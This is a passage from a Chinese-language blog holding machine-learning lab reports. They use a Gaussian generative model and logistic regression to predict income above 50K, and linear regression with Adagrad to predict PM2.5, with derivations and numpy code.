50K a year.\n3.2 读取数据 在 data_manager 类中有读取数据的函数 read()：\ndef read(self,name,path): with open(path,newline = \u0026#39;\u0026#39;) as csvfile: # 读取数据,从第二行开始读取 rows = np.array(list(csv.reader(csvfile))[1:] ,dtype = float) 3.3 数据预处理 3.3.1 对训练数据进行标准化 $$ \\sigma = \\sqrt{\\frac{1}{N}\\sum_{i=1}^{N}(x_i-\\mu)^2}\\ z_i = \\frac{x_i-\\mu}{\\sigma} $$\n这样可以使多组数据的均值为 0，方差为 1，使数据标准统一化。\nif name == \u0026#39;X_train\u0026#39;: self.mean = np.mean(rows,axis = 0).reshape(1,-1) self.std = np.std(rows,axis = 0).reshape(1,-1) self.theta = np.ones((rows.shape[1] + 1,1),dtype = float) #初始化参数 for i in range(rows.shape[0]): rows[i,:] = (rows[i,:] - self.mean) / self.std #标准化 # 注意，testing data要跟training data的normalize方式一致，要用training data的mean和std elif name == \u0026#39;X_test\u0026#39;: for i in range(rows.shape[0]): rows[i,:] = (rows[i,:] - self.mean) / self.std #标准化 4 概率生成模型（generative model） 4.1 公式推导 4.1.1 贝叶斯定理 根据条件概率： $$ P(x,y)=P(x|y)P(y) $$ 其中，$P(x|y)$ 是数据 $x$ 在给定标签 $y$ 下的条件概率，而 $P(y)$ 是标签 $y$ 的先验概率。\n贝叶斯定理： $$ P(y|x)=\\frac{P(x|y)P(y)}{P(x)} $$ 其中 $P(y|x)$ 是后验概率，$P(x)$ 是数据的边际条件。\n4.1.2 高斯分布 高斯分布概率密度函数为： $$ P(x) = \\frac{1}{(2\\pi)^{d/2} |\\Sigma|^{1/2}} \\exp \\left( -\\frac{1}{2} (x - \\mu)^T \\Sigma^{-1} (x - \\mu) \\right) $$\n$$ \\ln \\left( \\frac{P(C_1 | x)}{P(C_0 | x)} \\right) = \\ln \\left( \\frac{P(x | C_1) P(C_1)}{P(x | C_0) P(C_0)} \\right)= \\ln P(x | C_1) - \\ln P(x | C_0) + \\ln \\frac{P(C_1)}{P(C_0)} $$\n将上面的判别函数带入高斯分布的密度函数： $$ = -\\frac{1}{2} (x - \\mu_1)^T \\Sigma^{-1} (x - \\mu_1) + \\frac{1}{2} (x - \\mu_0)^T \\Sigma^{-1} (x - \\mu_0) + \\ln \\frac{n_1}{n_0} $$ 所以我们得到了判别函数： $$ f(x) = x^T \\Sigma^{-1} (\\mu_1 - \\mu_0) - \\frac{1}{2} (\\mu_1^T \\Sigma^{-1} \\mu_1 - \\mu_0^T \\Sigma^{-1} \\mu_0) + \\ln \\frac{n_1}{n_0} $$\n4.2 代码实现 4.2.1 对数据进行二分类 我们需要先根据 Y_train 中的数据，也就是根据年收入是否大于 5 万元，记录对应的下标。\nclass_0_id = [] class_1_id = [] for i in range(self.data[\u0026#39;Y_train\u0026#39;].shape[0]): # 对数据进行分类 if self.data[\u0026#39;Y_train\u0026#39;][i][0] == 0: class_0_id.append(i) else: class_1_id.append(i) class_0 = self.data[\u0026#39;X_train\u0026#39;][class_0_id] class_1 = self.data[\u0026#39;X_train\u0026#39;][class_1_id] 4.2.2 计算均值和协方差 $$ \\mu_ = \\frac{1}{n}\\sum_{i=0}^{n} x_i \\ \\sigma = \\frac{1}{n} \\sum_{i=0}^{n}(x_i -\\mu)(x_i-\\mu)^T $$\nmean_0 = np.mean(class_0, axis=0) # 分别计算两类的均值 mean_1 = np.mean(class_1, axis=0) n = class_0.shape[1] cov_0 = np.zeros((n, n)) cov_1 = np.zeros((n, n)) n_0 = class_0.shape[0] n_1 = class_1.shape[0] for i in range(class_0.shape[0]): # 计算协方差矩阵 # please add code here cov_0 += np.dot(np.transpose([class_0[i]-mean_0]), [class_0[i]-mean_0]) / n_0 for i in range(class_1.shape[0]): cov_1 += np.dot(np.transpose([class_1[i]-mean_1]), [class_1[i]-mean_1]) / n_1 然后我们需要合并这两个协方差矩阵，采用加权平均的方式。 $$ \\Sigma = \\frac{n_1 \\sigma_1+n_2 \\sigma_2}{n_1+n_2} $$\ncov = (n_0*cov_0+n_1*cov_1)/(n_0+n_1) # 计算协方差矩阵，使用加权的方法 cov_inv = inv(cov) 4.2.3 计算参数权重向量和偏置项 根据 Gaussian Distribution，将 Gaussian Distribution 代入 Sigmoid 函数 ，我们可以得到 $P(C_1|x)=\\sigma(w \\cdot x+b)$ ，我们需要计算出权重向量 w 和偏置项 b。\n化简得到： $$ w= \\Sigma ^{-1}(\\mu_1 - \\mu_0) $$ $$ b=-\\frac{1}{2}(\\mu_1^T\\Sigma^{-1}\\mu_1-\\mu_0^T\\Sigma^{-1}\\mu_0)+ln \\frac{n_1}{n_0} $$\nself.w = np.dot((mean_0-mean_1).transpose(), cov_inv).transpose() # 计算w self.b = (-0.5)*np.dot(np.dot(mean_0.transpose(), cov_inv), mean_0)+0.5 * \\ np.dot(np.dot(mean_1.transpose(), cov_inv),mean_1)+np.log(float(n_0)/n_1) # 计算b 4.2.4 Sigmoid 函数 $$\r\\sigma(z)=\\frac{1}{1+e^{-z}}\r$$\r将 $z=w \\cdot x+b$ 代入 sigmoid 函数，我们可以得到 $C_1$ 的后验概率 $P(C_1|x)=\\sigma(w \\cdot x+b)$ ，我们就可以根据这个概率来进行分类了，可以发现，Sigmoid函数的值域是 $(0,1)$，根据大于/小于 0.5 进行二分类。\rdef func(self, x): arr = np.empty([x.shape[0], 1], dtype=float) for i in range(x.shape[0]): z = x[i, :].dot(self.w) + self.b z *= (-1) arr[i][0] = 1 / (1 + np.exp(z)) return np.clip(arr, 1e-8, 1-(1e-8)) 4.2.5 predict 预测函数 根据公式 $P(C_1|x)=\\sigma(w \\cdot x+b)$ 计算出的概率，大于0.5设为 0，小于0.5设为 1。\ndef predict(self, x): ans = np.ones([x.shape[0], 1], dtype=int) for i in range(x.shape[0]): if x[i] \u0026gt; 0.5: ans[i] = 0 return ans 4.2.6 计算准确率 我们使用 X_train 进行预测，并使用 Y_train 的正确结果进行验证，从而计算出 acc。\ndef accuracy(self, x, y): # 根据训练数据计算准确率 result = self.func(x) answer = self.predict(result) return 1 - np.mean(np.abs(answer-y)) 4.2.7 将预测结果写入文件 def write_file(self, path): #预测测试数据并将结果写入文件 result = self.func(self.data[\u0026#39;X_test\u0026#39;]) answer = self.predict(result) with open(path, \u0026#39;w\u0026#39;, newline=\u0026#39;\u0026#39;) as csvfile: writer = csv.writer(csvfile) writer.writerow([\u0026#39;id\u0026#39;, \u0026#39;label\u0026#39;]) for i in range(answer.shape[0]): writer.writerow([i+1, answer[i][0]]) 预测结果：\n5 逻辑回归（Logistic Regression） 5.1 公式推导 5.1.1 Logistic Regression 的前提 假设我们有一组数据集 $(X, Y)$，其中：\n$X \\in \\mathbb{R}^{m \\times n}$：包含 $m$ 个样本，每个样本有 $n$ 个特征。 $Y \\in {0, 1}^m$：对应的分类标签，取值为 $0$ 或 $1$。 目标是学习一个模型，能够预测输入样本属于类 $1$ 的概率 $P(Y=1|X)$。 5.1.2 模型假设 逻辑回归假设： $$ P(Y=1|X) = \\sigma(z) = \\frac{1}{1 + e^{-z}} $$ 其中：\n$z = w^T X + b$：是线性组合，$w \\in \\mathbb{R}^n$ 是权重向量，$b$ 是偏置。\n$\\sigma(z)$ 是 sigmoid 函数，将任意实数映射到区间 $[0, 1]$。 因此，逻辑回归模型可以表示为： $$ P(Y=1|X) = \\frac{1}{1 + e^{-(w^T X + b)}} $$\n5.1.3 Loss 函数：最大似然估计 假设所有样本是独立同分布的，联合概率可以表示为： $$ P(Y|X; w, b) = \\prod_{i=1}^m \\Big(P(y^{(i)}|x^{(i)})\\Big) $$ 其中 $y^{(i)} \\in {0, 1}$ 是第 $i$ 个样本的标签。\n将 $P(y^{(i)}|x^{(i)})$ 写成通式： $$ P(y^{(i)}|x^{(i)}) = \\sigma(z^{(i)})^{y^{(i)}} \\cdot (1 - \\sigma(z^{(i)}))^{1 - y^{(i)}} $$ 因此，联合概率的对数似然函数为： $$ \\ell(w, b) = \\sum_{i=1}^m \\Big(y^{(i)} \\log(\\sigma(z^{(i)})) + (1 - y^{(i)}) \\log(1 - \\sigma(z^{(i)}))\\Big) $$ 其中 $z^{(i)} = w^T x^{(i)} + b$。\n为了优化方便，最小化负对数似然，其表达式为： $$ J(w, b) = -\\ell(w, b) = -\\frac{1}{m} \\sum_{i=1}^m \\Big(y^{(i)} \\log(\\sigma(z^{(i)})) + (1 - y^{(i)}) \\log(1 - \\sigma(z^{(i)}))\\Big) $$ 这被称为二分类的交叉熵损失函数（Cross-Entropy Loss）。\n5.1.4 梯度下降优化 为了最小化损失函数 $J(w, b)$，使用梯度下降法更新参数 $w$ 和 $b$。梯度计算如下：\n对 $w$ 的梯度： $$ \\frac{\\partial J(w, b)}{\\partial w} = \\frac{1}{m} \\sum_{i=1}^m (h^{(i)} - y^{(i)}) x^{(i)} $$\n​\t其中 $h^{(i)} = \\sigma(w^T x^{(i)} + b)$。\n对 $b$ 的梯度： $$ \\frac{\\partial J(w, b)}{\\partial b} = \\frac{1}{m} \\sum_{i=1}^m (h^{(i)} - y^{(i)}) $$\n梯度更新公式： $$ w = w - \\alpha \\frac{\\partial J(w, b)}{\\partial w} \\ b = b - \\alpha \\frac{\\partial J(w, b)}{\\partial b} $$\n​\t其中 $\\alpha$ 是学习率。\n5.2 代码实现 5.2.1 标准化 normalize 和 generative model 一致。\ndef normalize(X, mean=None, std=None): mean = np.mean(X, axis=0).reshape(1, -1) # 将每一行的元素相加求均值，实际上返回的是1行106列的数组 std = np.std(X, axis=0).reshape(1, -1) # 将每一行的元素相加求标准差，实际上返回的是1行106列的数组 X = (X - mean) / std # 标准化 return X, mean, std X_train, mean, std = normalize(X_train) # 标准化 X_test = (X_test - mean) / std # 使用训练集的均值和方差对测试集进行标准化 5.2.2 对训练数据进行划分 X_train 中 80% 作为训练集，20% 作为验证集。\ndef train_data_split(X, Y, ratio=0.8): # 对训练集进行划分 size = int(X.shape[0] * ratio) return X[:size], Y[:size], X[size:], Y[size:] X_train, Y_train, X_val, Y_val = train_data_split(X_train, Y_train) # 输出数据的大小和维度 print(\u0026#34;Size of X_train: {}\u0026#34;.format(X_train.shape[0])) print(\u0026#34;Size of X_val: {}\u0026#34;.format(X_val.shape[0])) print(\u0026#34;Size of X_test: {}\u0026#34;.format(X_test.shape[0])) print(\u0026#34;Dimension of X_train: {}\u0026#34;.format(X_train.shape[1])) 5.2.3 对数据进行打乱 将数据按行打乱，这样可以保证数据的随机性。\ndef shuffle(X, Y): # 对数据进行打乱 np.random.seed(0) randomize = np.arange(X.shape[0]) np.random.shuffle(randomize) return X[randomize], Y[randomize] 5.2.4 Loss 函数 根据交叉熵损失函数的公式： $$ J(w, b) = -\\ell(w, b) = -\\frac{1}{m} \\sum_{i=1}^m \\Big(y^{(i)} \\log(\\sigma(z^{(i)})) + (1 - y^{(i)}) \\log(1 - \\sigma(z^{(i)}))\\Big) $$\ndef cross_entropy_loss(y_pred, Y_label): cross_entropy = -np.mean( Y_label * np.log(y_pred) + (1 - Y_label) * np.log(1 - y_pred) ) return cross_entropy 5.2.5 计算梯度 根据梯度计算公式： $$ w_{grad}=\\frac{\\partial J(w, b)}{\\partial w} = \\frac{1}{m} \\sum_{i=1}^m (h^{(i)} - y^{(i)}) x^{(i)} \\ b_{grad}=\\frac{\\partial J(w, b)}{\\partial b} = \\frac{1}{m} \\sum_{i=1}^m (h^{(i)} - y^{(i)}) $$\ndef gradient(X, Y_label, w, b): # 计算梯度 y_pred = f(X, w, b) pred_error = Y_label - y_pred w_grad = -np.dot(pred_error, X) b_grad = -np.sum(pred_error) return w_grad, b_grad 5.2.6 训练 训练模型时，采用 Mini-Batch Gradient Descent 和 Adagrad 这两种梯度下降法。\nMini-Batch Gradient Descent： 结合了随机梯度下降（SGD）和全梯度下降的优点。 每次更新使用一小部分数据，计算速度较快，具有一定的噪声引入效果，有助于跳出局部极值。 Adagrad : 可以动态的调整学习率。 # 开始训练 Y_train = Y_train.flatten() # 将Y_train展平 Y_val = Y_val.flatten() # 将Y_val展平 w = np.zeros((X_train.shape[1],)) # 初始化w b = np.zeros((1,)) # 初始化b iter = 20 # 迭代次数 batch_size = 8 # 批次大小 learning_rate = 0.1 # 学习率 train_loss = [] val_loss = [] train_acc = [] val_acc = [] count = 1 # 初始化累积梯度 w_accum_grad = np.zeros((X_train.shape[1],)) b_accum_grad = np.zeros((1,)) for epoch in tqdm(range(iter)): X_train, Y_train = shuffle(X_train, Y_train) # 每次取batch_size个数据进行训练 for idx in range(int(np.floor(X_train.shape[0] / batch_size))): X = X_train[idx * batch_size:(idx + 1) * batch_size] Y = Y_train[idx * batch_size:(idx + 1) * batch_size] w_grad, b_grad = gradient(X, Y, w, b) # 累积梯度平方和，adagrad w_accum_grad += w_grad**2 b_accum_grad += b_grad**2 # 更新w和b w -= (learning_rate / np.sqrt(w_accum_grad + 1e-8)) * w_grad b -= (learning_rate / np.sqrt(b_accum_grad + 1e-8)) * b_grad 5.3 实验结果 6 实验评估 6.1 Accuracy 准确率方面，Logistic Regression 要略优于 Generative Model。\nLogistic Regression:\n逻辑回归是 判别模型，直接建模 P(Y∣X)，即条件概率分布。它的目标是通过最大化数据点的对数似然，直接优化分类边界，专注于如何在给定特征 X 下预测 Y。\n不关心特征 X 的分布，因此对于 X 分布的假设较少，更灵活。\nGenerative Model:\n生成模型通过建模联合概率分布 P(X, Y) 来推导条件概率 P(Y∣X)。它要求对 P(X∣Y) 和 P(Y) 分布做出明确的假设（如高斯分布）。\n如果数据本身不符合假设（例如 P(X∣Y) 不是高斯分布），生成模型可能产生偏差，影响分类性能。\n6.2 特征标准化对准确率的影响 未进行标准化： 进行标准化： 可以发现 acc 和 loss 的波动很大，而且几乎没有收敛的趋势，准确率也大大降低。\n标准化可以统一不同数据的平均值和标准差，提高了数据可比性，削弱了数据解释性。\n6.3 Logistic Regression 的正则化对模型准确率的影响 加入正则化后的损失函数： $$ Loss = CrossEntropyLoss+\\frac{\\lambda}{2}||w||^2 $$ 其中 $\\lambda$ 是正则化系数。\n$\\lambda=0.1$ 时：\n使用正则化 未使用正则化 train_acc 0.8528101965601965 0.8540770884520885 val_acc 0.8483033932135728 0.8515277138031629 可以发现加入了正则化参数后，模型的准确率有些许的下降，这可能与我们选择 adagrad 梯度下降有关。\n6.4 找到对结果影响最大的特征 # 找到影响最大的特征 with open(\u0026#39;X_train\u0026#39;, newline=\u0026#39;\u0026#39;) as csvfile: featrues = list(csv.reader(csvfile))[0] # 通过表头获取特征名 max = np.max(np.abs(w)) # 获取绝对值最大的权重 for i in range(len(w)): if abs(w[i]) == max: print(\u0026#34;The most important feature is: \u0026#34;, featrues[i], \u0026#34;with weight: \u0026#34;, w[i]) # 找出前五个特征 top_5_indices = np.argsort(-np.abs(w))[:5] print(\u0026#34;Top 5 important features and their weights:\u0026#34;) for i in top_5_indices: print(f\u0026#34;Feature: {featrues[i]}, Weight: {w[i]}\u0026#34;) ","permalink":"https://smera1d0.github.io/posts/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E9%AA%8C2-%E9%A2%84%E6%B5%8B%E5%B9%B4%E6%94%B6%E5%85%A5/","summary":"\u003ch2 id=\"1-实验目的\"\u003e1 实验目的\u003c/h2\u003e\n\u003cp\u003e使用 Classification 中的 generative model 和 logistic regression，解决二分类问题。根据已有数据，判断该人年收入是否大于 50K。\u003c/p\u003e\n\u003ch2 id=\"2-实验环境\"\u003e2 实验环境\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e操作系统：windows 11\u003c/li\u003e\n\u003cli\u003eCPU：AMD Ryzen 7 5800H with Radeon Graphics (3.20 GHz)\u003c/li\u003e\n\u003cli\u003eGPU：NVIDIA GeForce GTX 1650\u003c/li\u003e\n\u003cli\u003e运行环境：\n\u003cul\u003e\n\u003cli\u003ePython 3.10.11\u003c/li\u003e\n\u003cli\u003epandas 2.1.0\u003c/li\u003e\n\u003cli\u003enumpy 1.24.2\u003c/li\u003e\n\u003cli\u003ematplotlib 3.7.1\u003c/li\u003e\n\u003cli\u003etqdm 4.66.1\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"3-数据处理\"\u003e3 数据处理\u003c/h2\u003e\n\u003ch3 id=\"31-数据文件描述\"\u003e3.1 数据文件描述\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003etrain.csv / test.csv：包含 age, workclass, fnlwgt (总人数), education, education num, marital-status, occupation, relationship, race, sex, capital-gain, capital-loss, hours-per-week, native-country, make over 50K a year or not 这些特征。\u003c/p\u003e","title":"【机器学习】使用 generative model 和 logistic regression 预测年收入"},{"content":"一、实验目的 利用即墨站的空气质量监测数据，使用线性回归（Linear Regression）预测 PM2.5 的数值。\n二、实验环境 操作系统：Windows 11 处理器：AMD Ryzen 7 5800H with Radeon Graphics (3.20 GHz) 显卡：NVIDIA GeForce GTX 1650 运行环境： Python 3.10.11 pandas 2.1.0 numpy 1.24.2 matplotlib 3.7.1 tqdm 4.66.1 三、数据说明 1. 训练集（Train Set） train.csv包含了 2014 年 1 月 1 日至 2014 年 12 月 20 日的即墨站的全部监测数据，使用 VScode 插件转成表格形式如下所示：\n表头包含了日期、站点、测项以及24小时的监测数值 测项共有 18 项观测数据：AMB_TEMP， CH4， CO， NHMC， NO， NO2， NOx， O3， PM10， PM2.5， RAINFALL， RH， SO2， THC， WD_HR， WIND_DIREC， WIND_SPEED， WS_HR。 2. 测试集（Test Set） test.csv是从剩下的数据中取出的连续的 10 小时作为一笔数据，前 9 小时作为 feature，第 10 小时的 PM2.5 数值作为 answer。\n使用 VScode 插件转成表格形式如下所示：\n四、实验方法 1. 导入必要的库 import pandas as pd # 用于读取 csv 文件 import numpy as np # 用于创建向量和进行数学统计 import matplotlib.pyplot as plt # 用于绘制图像 from tqdm import tqdm # 用于显示进度条 2. 数据预处理 将数据按月份分为 12 组，每组有 18 行，每行有 $20 \\times 24 =480$ 小时的数据。\n构建训练数据 x，x 为每个连续 9 小时的数据，共 $12 \\times (480-9)=12 \\times 471$ 组，每组有 $9 \\times 18$ 个观测值。\n构建标签数据 y，y 为每个第 10 小时的数据，共 $12 \\times (480-9)=12 \\times 471$ 组，每组 1 个 观测值，即第 9 个观测项 PM2.5。\n然后计算每个特征的均值和标准差，再对每一个特征进行标准化处理。\n标准化： $$ \\hat{x_{i,j}}=\\frac{x_{i,j}-\\overline{x_{j}}}{\\sigma_j} $$ 对特征进行标准化处理可以使标准化后的特征的均值和方差变为 0\n# 读取训练数据集 data = pd.read_csv(\u0026#39;./train.csv\u0026#39;) # 处理数据，将 NR 替换为 0，并将数据转换为 numpy 数组 # 只选取有用的数据列 (从第四列开始) data = data.iloc[:, 3:] data[data == \u0026#39;NR\u0026#39;] = 0 raw_data = data.to_numpy() # 将数据按月份分割成 12 组，每个月有 18 行传感器数据，每行有 480 小时的数据 month_data = {} for month in range(12): sample = np.empty([18, 480]) for day in range(20): sample[:, day * 24: (day + 1) * 24] = raw_data[18 * (20 * month + day): 18 * (20 * month + day + 1), :] month_data[month] = sample # 构造训练数据 x 和标签数据 y，x 代表 9 小时的特征数据，y 代表第 10 小时的 PM2.5 数据 x = np.empty([12 * 471, 18 * 9], dtype=float) y = np.empty([12 * 471, 1], dtype=float) for month in range(12): for day in range(20): for hour in range(24): if day == 19 and hour \u0026gt; 14: # 最后一天只取到第 15 小时 continue x[month * 471 + day * 24 + hour, :] = month_data[month][:, day * 24 + hour: day * 24 + hour + 9].reshape(1, -1) y[month * 471 + day * 24 + hour, 0] = month_data[month][9, day * 24 + hour + 9] # 预测第 10 小时 PM2.5 值 mean_x = np.mean(x, axis=0) # 计算每个特征的均值 std_x = np.std(x, axis=0) # 计算每个特征的标准差 # 对特征数据 x 进行标准化处理 for i in range(len(x)): for j in range(len(x[0])): if std_x[j] != 0: # 避免除以零 x[i][j] = (x[i][j] - mean_x[j]) / std_x[j] 3. 训练模型 I. 模型定义 $$ \\hat{y}=X \\cdot w $$\n其中 $X$ 是特征矩阵，$w$ 是参数向量，$\\hat{y}$ 是预测值\nII. 损失函数 在训练过程中，我们使用**均方根误差（Root Mean Squared Error, RMSE）**作为损失函数来衡量模型的好坏。\nRMSE表达式： $$ Loss=\\sqrt{\\frac{1}{N}\\sum_{i=1}^{N}(\\hat{y_i}-y_i)^2} $$ 其中：\n$N$ 表示样本数。\n$\\hat{y_i}$ 表示模型预测的第 $i$ 个样本的预测值。\n$y_i$ 表示第 $i$ 个样本的真实值。\n$Loss$ 值越小表示模型的预测结果越接近真实值。\nIII. 梯度下降和 Adagrad 更新算法 梯度下降：\n线性回归使用梯度下降算法来最小化损失函数。 梯度计算公式： $$ grad=2X^T(Xw-y) $$\nAdagrad 更新算法：\nAdagrad（自适应梯度算法），该算法可以自适应地调整学习率。 Adagrad 累计梯度平方： $$ G_t=G_{t-1}+grad^2 $$\n​\t其中 $G_t$ 是累计梯度平方，用于存储从开始到现在的梯度平方和。\n权重更新公式（Adagrad）： $$ w=w-\\frac{\\alpha}{\\sqrt{G_t+\\epsilon}}\\cdot grad $$\n​\t其中 $\\alpha$ 是学习率，$\\epsilon$ 是一个很小的值，用于避免除以 0。\nIV. 代码实现 # 划分训练集和验证集，80% 作为训练集，20% 作为验证集 import math x_train_set = x[:math.floor(len(x) * 0.8), :] y_train_set = y[:math.floor(len(y) * 0.8), :] x_validation = x[math.floor(len(x) * 0.8):, :] y_validation = y[math.floor(len(y) * 0.8):, :] print(len(x_train_set)) print(len(y_train_set)) print(len(x_validation)) print(len(y_validation)) # 特征维度为 18 * 9，加上偏置项 w_0 dim = 18 * 9 + 1 w = np.zeros([dim, 1]) # 初始化权重为 0 x_train_set = np.concatenate((np.ones([len(x_train_set), 1]), x_train_set), axis=1).astype(float) # 添加偏置项，x_train_set 的第一列为 1 x_validation = np.concatenate((np.ones([len(x_validation), 1]), x_validation), axis=1).astype(float) # 添加偏置项，x_validation 的第一列为 1 learning_rates = [10,50,100,200] # 学习率 iter_time = 1000 # 迭代次数 adagrad = np.zeros([dim, 1]) # Adagrad 累积梯度平方 eps = 1e-10 # 避免除以零 loss_list=[] loss_list_dict={} # 训练模型，使用 Adagrad 方法更新参数 for learning_rate in learning_rates: for t in range(iter_time): loss = np.sqrt(np.sum((np.dot(x_train_set, w) - y_train_set) ** 2) / len(y_train_set)) # 计算 RMSE 损失 print(str(t) + \u0026#34;:\u0026#34; + str(loss)) loss_list.append(loss) gradient = 2 * np.dot(x_train_set.T, (np.dot(x_train_set, w) - y_train_set)) # 计算梯度 adagrad += gradient ** 2 w = w - learning_rate * gradient / np.sqrt(adagrad + eps) # 更新权重 loss_list_dict[learning_rate]=loss_list loss_list=[] np.save(f\u0026#39;weight{learning_rate}.npy\u0026#39;, w) # 保存模型参数 w=np.zeros([dim,1]) # 重新初始化权重 adagrad=np.zeros([dim,1]) # 重新初始化累积梯度平方 V. 保存参数和结果 将预测结果写入文件，文件格式为 submit_learning_rate{learning_rate}.csv，同时要处理预测结果为负值的情况，将负值替换为 0 。 # 将预测结果写入文件 if learning_rate==0.2: with open(f\u0026#39;submit.csv\u0026#39;, mode=\u0026#39;w\u0026#39;) as submit_file: submit_file.write(\u0026#39;id,value\\n\u0026#39;) for i in range(240): # 由于预测结果可能为负数，将负数转换为 0 if (predictions[i][0] \u0026gt;= 0): submit_file.write(f\u0026#39;id_{i},{predictions[i][0]}\\n\u0026#39;) else: submit_file.write(f\u0026#39;id_{i},0.00\\n\u0026#39;) 保存权重参数。 np.save(f\u0026#39;weight_learning_rate{learning_rate}.npy\u0026#39;, w) # 保存模型参数 4. 算法评估 I. 参数设置 选取学习率（Learning rate）为 [0.01,0.05,0.1,0.2,0.3]，迭代次数（iteration）设为40000\nII. 绘制关系曲线 绘制不同的学习率下，迭代次数和损失率之间的关系曲线：\nimport matplotlib.pyplot as plt # 用于绘制图像 plt.figure(figsize=(10,6)) colors=[\u0026#39;r\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;w\u0026#39;] plt.ylim(0,30) plt.xlim(0,iter_time) for i, learning_rate in enumerate(learning_rates): plt.plot(range(iter_time),loss_list_dict[learning_rate],colors[i],label=\u0026#39;learning rate = \u0026#39;+str(learning_rate)) plt.xlabel(\u0026#39;iterations\u0026#39;) plt.ylabel(\u0026#39;loss\u0026#39;) plt.legend() # 添加图例 plt.grid() plt.show() 从曲线上可以看出：\n学习率为 0.01 时，损失率（Loss）较大，而且曲线不够平滑。 学习率为 0.05 和 0.1 时，损失率下降的速度太慢，学习速度较慢。 学习率为 0.2 时，曲线较为平滑，而且平稳后的 Loss 值较低。 学习率为 0.3 时，曲线下降的速度较快，适合迭代次数较少的情况。 因此学习率选取为 0.2 较好，曲线平滑且损失率较低。\n5. 算法优化 I. 正则化 使用正则化防止过拟合\nL2 正则化（Ridge Regression）：\n在损失函数中加入 L2 正则化项，可以防止模型对训练数据的过度拟合。这样做可以惩罚权重过大的情况，使得模型更加平滑。 损失函数： $$ Loss=\\sqrt{\\frac{1}{N}\\sum_{i=1}^{N}(\\hat{y_i}-y_i)^2}+\\lambda \\sum_{i=1}^{N}w_i^2 $$\n​\t其中$\\lambda$ 为正则化强度。\n更新权重： $$ grad=grad+2\\lambda w $$\nL1 正则化（Lasso Regression）：\n使用 L1 正则化可以实现特征选择，可以减小模型复杂度，防止过拟合。\n正则化项：\n$$ \\lambda \\sum_{i=1}^N|w_i| $$\nII. 正则化代码实现 设置学习率为 0.2，迭代次数为 20000，lambdaL1=0.0005，lambda_L2=0.0005\nlearning_rate = 0.2 # 学习率 iter_time = 20000 # 迭代次数 # 正则化参数 lambda_l1 = 0.0005 # L1 正则化系数 lambda_l2 = 0.0005 # L2 正则化系数 loss_list = [] validation_loss_list = [] # 训练模型，使用 L1 和 L2 正则化的 Adagrad 方法更新参数 for t in range(iter_time): # 计算训练集损失 (RMSE) loss = np.sqrt(np.sum((np.dot(x_train_set, w) - y_train_set) ** 2) / len(y_train_set)) # 添加 L1 和 L2 正则化项到损失函数中 loss += lambda_l1 * np.sum(np.abs(w)) + lambda_l2 * np.sum(w ** 2) validation_loss = np.sqrt(np.sum((np.dot(x_validation, w) - y_validation) ** 2) / len(y_validation)) validation_loss_list.append(validation_loss) loss_list.append(loss) # 计算梯度 gradient = 2 * np.dot(x_train_set.T, (np.dot(x_train_set, w) - y_train_set)) # 添加 L1 正则化梯度 gradient += lambda_l1 * np.sign(w) # 添加 L2 正则化梯度 gradient += 2 * lambda_l2 * w # 使用 Adagrad 更新参数 adagrad += gradient ** 2 w = w - learning_rate * gradient / np.sqrt(adagrad + eps) III. 绘制曲线 绘制训练集和验证集的 Loss 曲线，如下所示：\n收敛趋势正常 训练集和验证集的损失接近 平稳期的损失率较低 五、实验结果 实验结果保存在了submit.csv中，预测了 1-12 月每个月最后 10 天第 10 小时的 PM2.5 数值，如下所示：\n六、实验总结 在本次实验中，成功地使用线性回归模型预测了 PM2.5 的数值。通过对数据的清洗和特征提取，使用训练集 train.csv 中的特征成功拟合出线性回归模型，并在验证集上进行了验证，最后使用了 test.csv 进行了预测。验证了线性回归模型在 PM2.5 预测中的应用效果。但是实验中使用的线性模型比较简单，难以适应空气质量等复杂的、非线性波动的数据，预测值可能与实际值之间存在较大偏差。\n七、附录 线性回归代码 lr.py from kaggle.api.kaggle_api_extended import KaggleApi import pandas as pd import numpy as np import matplotlib.pyplot as plt from tqdm import tqdm # 读取训练数据集 data = pd.read_csv(\u0026#39;./train.csv\u0026#39;) # 处理数据，将 NR 替换为 0，并将数据转换为 numpy 数组 # 只选取有用的数据列 (从第四列开始) data = data.iloc[:, 3:] data[data == \u0026#39;NR\u0026#39;] = 0 raw_data = data.to_numpy() # 将数据按月份分割成 12 组，每个月有 18 行传感器数据，每行有 480 小时的数据 month_data = {} for month in range(12): sample = np.empty([18, 480]) for day in range(20): sample[:, day * 24: (day + 1) * 24] = raw_data[18 * (20 * month + day): 18 * (20 * month + day + 1), :] month_data[month] = sample # 构造训练数据 x 和标签数据 y，x 代表 9 小时的特征数据，y 代表第 10 小时的 PM2.5 数据 x = np.empty([12 * 471, 18 * 9], dtype=float) y = np.empty([12 * 471, 1], dtype=float) for month in range(12): for day in range(20): for hour in range(24): if day == 19 and hour \u0026gt; 14: # 最后一天只取到第 15 小时 continue x[month * 471 + day * 24 + hour, :] = month_data[month][:, day * 24 + hour: day * 24 + hour + 9].reshape(1, -1) y[month * 471 + day * 24 + hour, 0] = month_data[month][9, day * 24 + hour + 9] # 预测第 10 小时 PM2.5 值 # 对特征数据 x 进行标准化处理 mean_x = np.mean(x, axis=0) # 计算每个特征的均值 std_x = np.std(x, axis=0) # 计算每个特征的标准差 # for i in range(len(x)): for j in range(len(x[0])): if std_x[j] != 0: # 避免除以零 x[i][j] = (x[i][j] - mean_x[j]) / std_x[j] # 划分训练集和验证集，80% 作为训练集，20% 作为验证集 import math x_train_set = x[:math.floor(len(x) * 0.8), :] y_train_set = y[:math.floor(len(y) * 0.8), :] x_validation = x[math.floor(len(x) * 0.8):, :] y_validation = y[math.floor(len(y) * 0.8):, :] # 打印训练集和验证集的维度 print(len(x_train_set)) print(len(y_train_set)) print(len(x_validation)) print(len(y_validation)) # 读取测试数据并进行预处理 testdata = pd.read_csv(\u0026#39;./test.csv\u0026#39;, header=None) test_data = testdata.iloc[:, 2:] #test_data[test_data == \u0026#39;NR\u0026#39;] = 0 test_data = test_data.replace(\u0026#39;NR\u0026#39;, 0) test_data = test_data.to_numpy() # 构造测试数据集 test_x test_x = np.empty([240, 18 * 9], 